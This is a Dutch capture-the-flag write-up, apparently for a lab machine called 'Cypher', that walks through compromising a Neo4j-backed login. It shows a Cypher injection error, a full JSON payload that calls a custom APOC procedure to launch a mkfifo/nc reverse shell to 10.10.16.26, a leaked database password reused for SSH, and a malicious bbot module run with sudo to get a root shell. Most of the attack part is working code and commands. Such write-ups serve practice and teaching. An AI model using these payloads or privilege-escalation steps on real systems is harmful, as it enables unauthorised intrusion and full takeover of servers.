# Cypher

Een random company webpage, het eerste wat opvalt is dat er een `login` pagina
is wat misschien interessant is om naar te kijken. Lijkt er ook grotendeels op
een custom iets, geen duidelijke indicatie van CSM of iets dergelijks.

Ze claimen een demo omgeving te hebben maar daarmee kom je gelijk bij de login pagina uit.

# FFUF

Met `ffuf` komen we wel een open directory tegen met daarin een
`custom-apoc-extension-1.0-SNAPSHOT.jar`. Dit kan wel iets leuks zijn.

# Injection

In de HTML code zien we ook een comment over dat user niet meer in neo4j
opgeslagen moeten worden. Met wat SQL injectie maar dan op de cypher manier
kunnen we een error triggeren met een `'` in het username veld. De error is:

```
{
	message: Query cannot conclude with MATCH (must be a RETURN clause, 
	a FINISH clause, an update clause, a unit subquery call, or a 
	procedure call with no YIELD). 
	(line 1, column 1 (offset: 0))
	
	"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' OR 1=1; //' return h.value as hash"
 ^}
```

# Payload

Uiteindelijk via de `mkfifo` een revshell te pakken gekregen. De gebruikte
payload is:

```json
{
  "username": "admin' OR 1=1 CALL custom.getUrlStatusCode('http://10.10.16.26:9000/$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.26 9001 >/tmp/f)') YIELD statusCode RETURN statusCode as hash; //",
  "password": ""
}
```

# Users

Op de server komen we twee users tegen: `neo4j` (onze revshell user) en
`graphasm`. In `/home/graphasm/bbot_preset.yml` (_die we mogen uitlezen_) vinden
we de inlog voor neo4j database

```
neo4j:cU4btyib.20xtCMCXkBmerhK
```

In de database vinden we wel een sha hash die we niet kunnen kraken maar de
login voor de DB geeft ook SSH access op de `graphasm` user.

# Privesc

De `graphasm` user mag als root een tool genaamd bbot uitvoeren. Deze tool heeft
de mogelijkheid om custom modules in te laden wat het natuurlijk vrij makkelijk
maakt om een root shell te krijgen met wat python.

Na wat uitzoek werk kom ik op het volgende uit (_allemaal in eigen /tmp/ folder_)

```yml
# preset.yml
description: FFF

module_dirs:
  - /tmp/fff
```

```python
# fff.py
from bbot.modules.base import BaseModule

import pty

class fff(BaseModule):
        watched_events = []
        produced_events = [ "FFF" ]
        flags = [ "passive", "safe" ]
        meta = { "description": "fff" }
        options = {}
        per_domain_only = True

        base_url = "http://localhost"

        async def setup(self):
                print("test")
                pty.spawn("/bin/bash")

        async def handle_event(self):
                print("test")
```

Dan kan met het volgende een root shell gekregen worden

```bash
sudo bbot -p /tmp/fff/preset.yml -m fff
```
